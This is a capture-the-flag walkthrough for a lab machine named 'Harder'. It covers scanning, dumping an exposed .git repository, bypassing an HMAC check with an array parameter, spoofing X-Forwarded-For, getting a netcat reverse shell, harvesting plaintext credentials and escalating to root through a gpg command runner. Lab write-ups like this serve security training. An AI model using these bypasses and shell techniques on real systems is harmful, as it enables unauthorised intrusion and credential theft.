@@ -1,0 +1,484 @@
+Harder
+
+NMAP RESULTS:
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.3 (protocol 2.0)
+| ssh-hostkey: 
+|   4096 cf:e2:d9:27:d2:d9:f3:f7:8e:5d:d2:f9:9d:a4:fb:66 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCns4FcsZGpefUl1pFm7KRPBXz7nIQ590yiEd6aNm6DEKKVQOUUT4TtSEpCaUhnDU/+XHFBJfXdm73tzEwCgN7fyxmXSCWDWu1tC1zui3CA/sr/g5k+Az0u1yTvoc3eUSByeGvVyShubpuCB5Mwa2YZJxiHu/WzFrtDbGIGiVcQgLJTXdXE+aK7hbsx6T9HMJpKEnneRvLY4WT6ZNjw8kfp6oHMFvz/lnDffyWMNxn9biQ/pSkZHOsBzLcAfAYXIp6710byAWGwuZL2/d6Yq1jyLY3bic6R7HGVWEX6VDcrxAeED8uNHF8kPqh46dFkyHekOOye6TnALXMZ/uo3GSvrJd1OWx2kZ1uPJWOl2bKj1aVKKsLgAsmrrRtG1KWrZZDqpxm/iUerlJzAl3YdLxyqXnQXvcBNHR6nc4js+bJwTPleuCOUVvkS1QWkljSDzJ878AKBDBxVLcFI0vCiIyUm065lhgTiPf0+v4Et4IQ7PlAZLjQGlttKeaI54MZQPM53JPdVqASlVTChX7689Wm94//boX4/YlyWJ0EWz/a0yrwifFK/fHJWXYtQiQQI02gPzafIy7zI6bO3N7CCkWdTbBPmX+zvw9QcjCxaq1T+L/v04oi0K1StQlCUTE12M4fMeO/HfAQYCRm6tfue2BlAriIomF++Bh4yO73z3YeNuQ==
+|   256 1e:45:7b:0a:b5:aa:87:e6:1b:b1:b7:9f:5d:8f:85:70 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB+INGLWU0nf9OkPJkFoW9Gx2tdNEjLVXHrtZg17ALjH
+80/tcp open  http    syn-ack nginx 1.18.0
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: nginx/1.18.0
+|_http-title: Error
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+GOBUSTER RESULTS:
+
+kali@kali:~$ gobuster dir -u http://10.10.174.177:80 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 30
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.174.177:80
+[+] Threads:        30
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/01/30 08:25:48 Starting gobuster
+===============================================================
+Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.174.177:80/b18b9e1a-96d6-450e-8bf4-cdd4e3a0cf92 => 200. To force processing of Wildcard responses, specify the '--wildcard' switch
+
+THIS MEANS THAT ITS REDIRECTES OUR REQUEST , SO LETS USE BURP TO CHECK THE REDIRECTION
+
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Sat, 30 Jan 2021 13:28:36 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.19
+Set-Cookie: TestCookie=just+a+test+cookie; expires=Sat, 30-Jan-2021 14:28:36 GMT; Max-Age=3600; path=/; domain=pwd.harder.local; secure
+Content-Length: 1985
+
+<!DOCTYPE html>
+
+WE CAN SEE THAT IS IS REDIRECTING OUR REQUEST TO THAT DOMAIN ,SO ADD THIS IN /ETC/HOSTS FILE
+AFTER ADDING THIS AND NAVIGATING THROUGH THE DOMAIN, WE FIND A LOGIN PAGE
+USING THE DEFAULT CREDS AS admin:admin I GOT LOGGED IN, BUT THE PAGE SAYS:
+
+extra security in place. our source code will be reviewed soon ...
+
+AS WE SEE THE ROOM TAGS 'GIT' IS ALSO PRESENT
+THEREFORE THERE MUST BE A GIT DIRECTORY(.git)
+
+SO USE 'gitdumper.sh' TO DUMP THE WHOLE REPOSITORY
+
+──(kali㉿kali)-[/opt/GitTools/Dumper]
+└─$ ./gitdumper.sh http://pwd.harder.local/.git/ ~/harder/git
+###########
+# GitDumper is part of https://github.com/internetwache/GitTools
+#
+# Developed and maintained by @gehaxelt from @internetwache
+#
+# Use at your own risk. Usage might be illegal in certain circumstances. 
+# Only for educational purposes!
+###########
+
+
+[*] Destination folder does not exist
+[+] Creating /home/kali/harder/git/.git/
+[+] Downloaded: HEAD
+[-] Downloaded: objects/info/packs
+[+] Downloaded: description
+[+] Downloaded: config
+[+] Downloaded: COMMIT_EDITMSG
+[+] Downloaded: index
+[-] Downloaded: packed-refs
+[+] Downloaded: refs/heads/master
+[-] Downloaded: refs/remotes/origin/HEAD
+[-] Downloaded: refs/stash
+[+] Downloaded: logs/HEAD
+[+] Downloaded: logs/refs/heads/master
+[-] Downloaded: logs/refs/remotes/origin/HEAD
+[-] Downloaded: info/refs
+[+] Downloaded: info/exclude
+[-] Downloaded: /refs/wip/index/refs/heads/master
+[-] Downloaded: /refs/wip/wtree/refs/heads/master
+[+] Downloaded: objects/93/99abe877c92db19e7fc122d2879b470d7d6a58
+[-] Downloaded: objects/00/00000000000000000000000000000000000000
+[+] Downloaded: objects/ad/68cc6e2a786c4e671a6a00d6f7066dc1a49fc3
+[+] Downloaded: objects/04/7afea4868d8b4ce8e7d6ca9eec9c82e3fe2161
+[+] Downloaded: objects/e3/361e96c0a9db20541033f254df272deeb9dba7
+[+] Downloaded: objects/c6/66164d58b28325393533478750410d6bbdff53
+[+] Downloaded: objects/aa/938abf60c64cdb2d37d699409f77427c1b3826
+[+] Downloaded: objects/cd/a7930579f48816fac740e2404903995e0ff614
+[+] Downloaded: objects/22/8694f875f20080e29788d7cc3b626272107462
+[+] Downloaded: objects/66/428e37f6bfaac0b42ce66106bee0a5bdf94d4e
+[+] Downloaded: objects/6e/1096eae64fede71a78e54999236553b75b3b65
+[+] Downloaded: objects/be/c719ffb34ca3d424bd170df5f6f37050d8a91c
+
+
+LETS CHECK THEM OUT
+
+┌──(kali㉿kali)-[~/harder/git]
+└─$ git show                                                                                                                                                      128 ⨯
+commit 9399abe877c92db19e7fc122d2879b470d7d6a58 (HEAD -> master)
+Author: evs <evs@harder.htb>
+Date:   Thu Oct 3 18:12:23 2019 +0300
+
+    add gitignore
+
+diff --git a/.gitignore b/.gitignore
+new file mode 100644
+index 0000000..cda7930
+--- /dev/null
++++ b/.gitignore
+@@ -0,0 +1,2 @@
++credentials.php
++secret.php
+
+I SEE THE LOGS:
+
+┌──(kali㉿kali)-[~/harder/git/extract]
+└─$ git log 
+commit 9399abe877c92db19e7fc122d2879b470d7d6a58 (HEAD -> master)
+Author: evs <evs@harder.htb>
+Date:   Thu Oct 3 18:12:23 2019 +0300
+
+    add gitignore
+
+commit 047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161
+Author: evs <evs@harder.htb>
+Date:   Thu Oct 3 18:11:32 2019 +0300
+
+    add extra security
+
+commit ad68cc6e2a786c4e671a6a00d6f7066dc1a49fc3
+Author: evs <evs@harder.htb>
+Date:   Thu Oct 3 14:00:52 2019 +0300
+
+    added index.php
+
+
+WE KNOW THAT, credentials.php and secret.php ARE AVAILABLE ON THE SERVER BUT WE DON'T HAVE ACCESS TO THEM
+
+now we have to read to source code which we get (restore) from the git repo
+
+first looking into the index.php:
+
+<?php
+  session_start();
+  require("auth.php");
+  $login = new Login;
+  $login->authorize();
+  require("hmac.php");
+  require("credentials.php");
+?> 
+  <table style="border: 1px solid;">
+     <tr>
+       <td style="border: 1px solid;">url</td>
+       <td style="border: 1px solid;">username</td>
+       <td style="border: 1px solid;">password (cleartext)</td>
+     </tr>
+     <tr>
+       <td style="border: 1px solid;"><?php echo $creds[0]; ?></td>
+       <td style="border: 1px solid;"><?php echo $creds[1]; ?></td>
+       <td style="border: 1px solid;"><?php echo $creds[2]; ?></td>
+     </tr>
+   </table>
+
+
+we can see that, it requires tweo files 'auth.php' and 'credentials.php'
+and then printing the credentials from the 'creds' array on the screen
+
+
+now look at the auth.php:
+
+class Login {
+	// unique prefix that is used with this object (on cookies and password salt)
+	var $prefix = "login_";
+	// days "remember me" cookies will remain
+	var $cookie_duration = 21;
+	// temporary values for comparing login are auto set here. do not set your own $user or $pass here
+	var $user = "";
+	var $pass = "";
+
+  function authorize() {
+	//save cookie info to session
+	if(isset($_COOKIE[$this->prefix.'user'])){
+		$_SESSION[$this->prefix.'user'] = $_COOKIE[$this->prefix.'user'];
+		$_SESSION[$this->prefix.'pass'] = $_COOKIE[$this->prefix.'pass'];
+	}
+
+	//if setting vars
+	if(isset($_POST['action']) && $_POST['action'] == "set_login"){
+
+		$this->user = $_POST['user'];
+		$this->pass = md5($this->prefix.$_POST['pass']); //hash password. salt with prefix
+
+		$this->check();//dies if incorrect
+
+		//if "remember me" set cookie
+		if(isset($_POST['remember'])){
+			setcookie($this->prefix."user", $this->user, time()+($this->cookie_duration*86400));// (d*24h*60m*60s)
+			setcookie($this->prefix."pass", $this->pass, time()+($this->cookie_duration*86400));// (d*24h*60m*60s)
+		}
+
+		//set session
+		$_SESSION[$this->prefix.'user'] = $this->user;
+		$_SESSION[$this->prefix.'pass'] = $this->pass;
+	}
+
+	//if forced log in
+	elseif(isset($_GET['action']) && $_GET['action'] == "prompt"){
+		session_unset();
+		session_destroy();
+		//destroy any existing cookie by setting time in past
+		if(!empty($_COOKIE[$this->prefix.'user'])) setcookie($this->prefix."user", "blanked", time()-(3600*25));
+		if(!empty($_COOKIE[$this->prefix.'pass'])) setcookie($this->prefix."pass", "blanked", time()-(3600*25));
+
+		$this->prompt();
+	}
+
+	//if clearing the login
+	elseif(isset($_GET['action']) && $_GET['action'] == "clear_login"){
+		session_unset();
+		session_destroy();
+		//destroy any existing cookie by setting time in past
+		if(!empty($_COOKIE[$this->prefix.'user'])) setcookie($this->prefix."user", "blanked", time()-(3600*25));
+		if(!empty($_COOKIE[$this->prefix.'pass'])) setcookie($this->prefix."pass", "blanked", time()-(3600*25));
+
+		$msg = '<span class="green">'.LOGOUT_COMPLETE.'</span>';
+		$this->prompt($msg);
+	}
+
+	//prompt for
+	elseif(!isset($_SESSION[$this->prefix.'pass']) || !isset($_SESSION[$this->prefix.'user'])){
+		$this->prompt();
+	}
+
+	//check the pw
+	else{
+		$this->user = $_SESSION[$this->prefix.'user'];
+		$this->pass = $_SESSION[$this->prefix.'pass'];
+		$this->check();//dies if incorrect
+	}
+
+}
+
+function check(){
+
+	if(md5($this->prefix . LOGIN_PASS) != $this->pass || LOGIN_USER != $this->user){
+		//destroy any existing cookie by setting time in past
+		if(!empty($_COOKIE[$this->prefix.'user'])) setcookie($this->prefix."user", "blanked", time()-(3600*25));
+		if(!empty($_COOKIE[$this->prefix.'pass'])) setcookie($this->prefix."pass", "blanked", time()-(3600*25));
+		session_unset();
+		session_destroy();
+
+		$msg='<span class="red">'.INCORRECT_USERNAME_PASSWORD.'</span>';
+		$this->prompt($msg);
+	}
+}
+
+function prompt($msg=''){
+
+
+we can see that, this code ony checks the cookies for authorization during login,logout,clearing session etc
+
+we also have a 'hmac.php' file also:
+
+
+<?php
+if (empty($_GET['h']) || empty($_GET['host'])) {
+   header('HTTP/1.0 400 Bad Request');
+   print("missing get parameter");
+   die();
+}
+require("secret.php"); //set $secret var
+if (isset($_GET['n'])) {
+   $secret = hash_hmac('sha256', $_GET['n'], $secret);
+}
+
+$hm = hash_hmac('sha256', $_GET['host'], $secret);
+if ($hm !== $_GET['h']){
+  header('HTTP/1.0 403 Forbidden');
+  print("extra security check failed");
+  die();
+}
+?>
+
+this files cheking the parameters provided ie 'h' or 'host' and this files requires the 'secret.php' file
+if these are present then we have 400 request
+if 'n' parameter is set then it creates a sha256 hash and store it in the $secret variable which is in the 'secret.php' i guess
+
+'n' is actually an array which on passing as argument will cause the value of $secret 'false'
+Now $secret becomes false then the third parameter becomes false and we can generate hmac hash of any text and get further.
+
+THE LAST CONDITION SAYS THAT $hm SHOULD EQUAL TO $_GET['h'] THEN ONLY WE CAN BYPASS THE CHECK
+
+php > echo hash_hmac('sha256',Array(),$s);
+PHP Notice:  Undefined variable: s in php shell code on line 1
+PHP Warning:  hash_hmac() expects parameter 2 to be string, array given in php shell code on line 1
+php > echo hash_hmac('sha256','hack.com',false);
+3a9a5d25cbbda01eb382ffaaa5d1493478b736dc1da277e1140c7408aec34727
+php > 
+
+now using this URL:
+
+POST /index.php?n[]=&host=hack.com&h=3a9a5d25cbbda01eb382ffaaa5d1493478b736dc1da277e1140c7408aec34727
+
+WE GET THE CREDENTIALS:
+ url 	                    username 	password (cleartext)
+http://shell.harder.local 	evs 	9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm
+
+
+WE GOT A NEW SUBDOMAIN, ADD THIS TO HOSTS FILE
+
+AFTER LOGIN AGAIN USING THIS CREDS ON NEW SUBDOMAIN, THE PAGE SAYS:
+
+
+Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed
+
+So now we need to bypass this. In order to bypass this, we need to set the 'X-Forwarded-For' header and set its value to 10.10.10.0/24
+
+AFTER THIS WE GOT A PHP SHELL EXECUTOR
+LETS GET OUR REVESE SHELL:
+YOU HAVE TO DO THIS THROUGH BURP BECAUSE NORMALLY IT WILL EXPIRE YOUR WEBPAGE
+
+i don't know why im not able to get the reverse shell, i think we should enumerate like this only
+
+
+but i tried again i found out this machine has netcat, using this i got a reverse shell:
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.179.204] 46243
+
+id
+uid=1001(www) gid=1001(www) groups=1001(www)
+
+which python
+   
+which python3
+/usr/bin/python3
+
+using find command for user 'www' i found a interesting file:
+/etc/periodic/15min/evs-backup.sh
+
+LETS CHECK IT
+/usr/sbin $ cat /etc/periodic/15min/evs-backup.sh
+#!/bin/ash
+
+# ToDo: create a backup script, that saves the /www directory to our internal server
+# for authentication use ssh with user "evs" and password "U6j1brxGqbsUA$pMuIodnb$SZB4$bw14"
+/usr/sbin $
+
+WE GOT THE SSH CREDS!!
+
+
+┌──(kali㉿kali)-[~]
+└─$ ssh evs@shell.harder.local
+The authenticity of host 'shell.harder.local (10.10.179.204)' can't be established.
+ED25519 key fingerprint is SHA256:qe/uay80+hZjgfhQilcT9xOMMgrAk0nCK7Ng5g7bLMM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'shell.harder.local,10.10.179.204' (ED25519) to the list of known hosts.
+evs@shell.harder.local's password: 
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See <http://wiki.alpinelinux.org/>.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+harder:~$ ls -la
+total 20
+drwxr-sr-x    1 evs      evs           4096 Mar 12 08:43 .
+drwxr-xr-x    1 root     root          4096 Jul  7  2020 ..
+-rw-------    1 evs      evs              7 Mar 12 08:43 .ash_history
+-rw-r--r--    1 evs      evs             33 Jul  6  2020 user.txt
+harder:~$ 
+
+
+WE ARE IN!!
+checking for the suid bits:
+
+harder:/etc$ find / -type f -perm -u=s 2>/dev/null
+/usr/local/bin/execute-crypted
+harder:/etc$ 
+
+harder:/etc$ /usr/local/bin/execute-crypted
+[*] Current User: root
+[-] This program runs only commands which are encypted for root@harder.local using gpg.
+[-] Create a file like this: echo -n whoami > command
+[-] Encrypt the file and run the command: execute-crypted command.gpg
+
+also find a find associated with this binary:
+harder:/usr/local/bin$ cat run-crypted.sh 
+#!/bin/sh
+
+if [ $# -eq 0 ]
+  then
+    echo -n "[*] Current User: ";
+    whoami;
+    echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
+    echo "[-] Create a file like this: echo -n whoami > command"
+    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
+  else
+    export GNUPGHOME=/root/.gnupg/
+    gpg --decrypt --no-verbose "$1" | ash
+fi
+
+which is setting a environ variable then decypting our code, pipe it to the ash command for execution
+so for encryption we have to find a public key 
+
+harder:/usr/local/bin$ find / -type f -name '*root@harder.local*' 2>/dev/null
+/var/backup/root@harder.local.pub
+harder:/usr/local/bin$ 
+
+WE FOUND IT
+
+now import this gpg public key:
+
+harder:/usr/local/bin$ gpg --import /var/backup/root@harder.local.pub 
+gpg: directory '/home/evs/.gnupg' created
+gpg: keybox '/home/evs/.gnupg/pubring.kbx' created
+gpg: /home/evs/.gnupg/trustdb.gpg: trustdb created
+gpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported
+gpg: Total number processed: 1
+gpg:               imported: 1
+harder:/usr/local/bin$
+
+encrypt the key:
+
+harder:~$ gpg -r root@harder.local -e cmd 
+gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user
+
+sub  cv25519/6C1C04522C049868 2020-07-07 Administrator <root@harder.local>
+ Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
+      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868
+
+It is NOT certain that the key belongs to the person named
+in the user ID.  If you *really* know what you are doing,
+you may answer the next question with yes.
+
+Use this key anyway? (y/N) y
+harder:~$ ls
+cmd       cmd.gpg   user.txt
+harder:~$ 
+
+now run that binary with .gpg file as an argument
+
+harder:~$ echo "cat /root/root.txt" > cmd
+harder:~$ gpg -r root@harder.local -e cmd 
+gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user
+
+sub  cv25519/6C1C04522C049868 2020-07-07 Administrator <root@harder.local>
+ Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
+      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868
+
+It is NOT certain that the key belongs to the person named
+in the user ID.  If you *really* know what you are doing,
+you may answer the next question with yes.
+
+Use this key anyway? (y/N) y
+File 'cmd.gpg' exists. Overwrite? (y/N) y
+harder:~$ /usr/local/bin/execute-crypted cmd.gpg 
+gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
+      "Administrator <root@harder.local>"
+3a7bd72672889e0756b09f0566935a6c
+harder:~$ 
+
+GOT THE ROOT FLAG
+
+
